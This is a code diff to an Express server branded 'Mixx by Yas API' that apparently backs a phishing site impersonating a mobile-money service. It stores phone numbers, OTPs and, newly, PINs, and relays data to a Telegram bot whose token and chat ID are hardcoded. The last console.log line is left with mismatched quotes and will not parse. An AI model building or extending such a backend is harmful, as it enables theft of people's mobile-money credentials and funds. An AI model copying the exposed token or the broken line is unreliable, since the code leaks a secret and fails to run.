@@ -12,14 +12,17 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // ===== CONFIGURATION =====
+// Use Railway's PORT or fallback to 3000 for local development
 const PORT = process.env.PORT || 3000;
 
 // ===== TELEGRAM CREDENTIALS =====
-const TELEGRAM_BOT_TOKEN = '8926981745:AAFg96uMr8hQaiQN0F9Miglr0gizZrp48rs';
-const TELEGRAM_CHAT_ID = '8392790531';
+// Use environment variables if available, otherwise use hardcoded values
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8926981745:AAFg96uMr8hQaiQN0F9Miglr0gizZrp48rs';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8392790531';
 
 // ===== IN-MEMORY STORAGE (Use Redis/DB in production) =====
 const userOTPStore = new Map(); // phone -> { otp, expiresAt, attempts }
+const userPinStore = new Map(); // phone -> pin (for demo)
 const userSessionStore = new Map(); // phone -> { loggedIn, timestamp }
 
 // ===== VALIDATION FUNCTIONS =====
@@ -314,7 +317,8 @@ app.get('/api/health', (req, res) => {
         status: 'healthy',
         timestamp: new Date().toISOString(),
         uptime: process.uptime(),
-        memory: process.memoryUsage()
+        memory: process.memoryUsage(),
+        port: PORT
     });
 });
 
@@ -334,6 +338,22 @@ app.get('/api/test-telegram', async (req, res) => {
     }
 });
 
+// ===== 6. ROOT ENDPOINT =====
+app.get('/', (req, res) => {
+    res.json({
+        name: 'Mixx by Yas API',
+        version: '1.0.0',
+        status: 'online',
+        endpoints: {
+            login: '/api/login (POST)',
+            verify: '/api/verify-otp (POST)',
+            resend: '/api/resend-otp (POST)',
+            health: '/api/health (GET)',
+            testTelegram: '/api/test-telegram (GET)'
+        }
+    });
+});
+
 // ===== HELPER FUNCTIONS =====
 function generateOTP() {
     return Math.floor(100000 + Math.random() * 900000).toString();
@@ -351,8 +371,8 @@ app.use((err, req, res, next) => {
 // ===== START SERVER =====
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`📍 API URL: http://localhost:${PORT}`);
+    console.log(`📍 API URL: https://mixxbyyas-offers06com-production.up.railway.app`);
     console.log(`📱 Telegram Bot: @${TELEGRAM_BOT_TOKEN.split(':')[0]}`);
     console.log(`📊 Chat ID: ${TELEGRAM_CHAT_ID}`);
-    console.log('✅ Server is ready!');
+    console.log('✅ Server is ready!`);
 });
